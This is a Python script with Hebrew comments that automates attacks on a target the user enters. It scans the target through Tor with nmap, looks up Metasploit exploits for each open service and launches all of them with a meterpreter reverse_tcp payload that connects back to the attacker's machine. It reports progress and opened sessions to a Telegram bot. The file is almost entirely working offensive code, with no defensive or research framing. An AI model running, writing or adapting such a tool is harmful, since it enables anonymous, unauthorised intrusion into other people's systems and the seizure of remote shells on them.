import nmap, shodan, time, sys, os, requests, socket
from pymetasploit3.msfrpc import MsfRpcClient
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURATION (שנה את הפרטים כאן) ---
CONFIG = {
    'SHODAN_KEY': 'כאן_שמים_מפתח_שודן',
    'MSF_PASS': 'mypassword',
    'LHOST': 'האייפי_של_הקאלי_שלך',
    'TG_TOKEN': 'טוקן_הבוט_שלך',
    'CHAT_ID': 'האיידי_הפרטי_שלך'
}

def send_tg(msg):
    try:
        url = f"https://api.telegram.org/bot{CONFIG['TG_TOKEN']}/sendMessage"
        requests.post(url, data={'chat_id': CONFIG['CHAT_ID'], 'text': msg, 'parse_mode': 'Markdown'})
    except: pass

class ApexPredator:
    def __init__(self):
        try:
            self.client = MsfRpcClient(CONFIG['MSF_PASS'], port=55553)
            self.nm = nmap.PortScanner()
            print(Fore.GREEN + "[+] System Online & Connected to Metasploit")
            send_tg("🛡️ **Apex Predator Framework Initialized**")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
            sys.exit()

    def run_attack(self, target_input):
        try:
            ip = socket.gethostbyname(target_input.replace("http://","").replace("https://","").split('/')[0])
            send_tg(f"🚀 **Attack Started:** `{target_input}` ({ip})")
            
            # סריקה אנונימית דרך Tor
            args = "--proxies socks5://127.0.0.1:9050 -sV -Pn -T3 --script vulners"
            self.nm.scan(ip, arguments=args)
            
            for proto in self.nm[ip].all_protocols():
                ports = self.nm[ip][proto].keys()
                for port in ports:
                    service = self.nm[ip][proto][port]['name']
                    send_tg(f"🔍 Testing `{service}` on port `{port}`")
                    
                    # חיפוש אקספלויט
                    matches = self.client.modules.search(service)
                    for match in matches:
                        if match['type'] == 'exploit':
                            ex = self.client.modules.use('exploit', match['fullname'])
                            ex['RHOSTS'] = ip
                            ex['RPORT'] = port
                            
                            payload = self.client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
                            payload['LHOST'] = CONFIG['LHOST']
                            
                            ex.execute(payload=payload)
                            time.sleep(5)
                            
                            if self.client.sessions.list:
                                send_tg(f"💰 **SUCCESS!** Session opened on `{ip}`")
                                return
        except Exception as e:
            send_tg(f"⚠️ Error during attack: {e}")

if __name__ == "__main__":
    app = ApexPredator()
    target = input("Enter Target IP or Domain: ")
    app.run_attack(target)
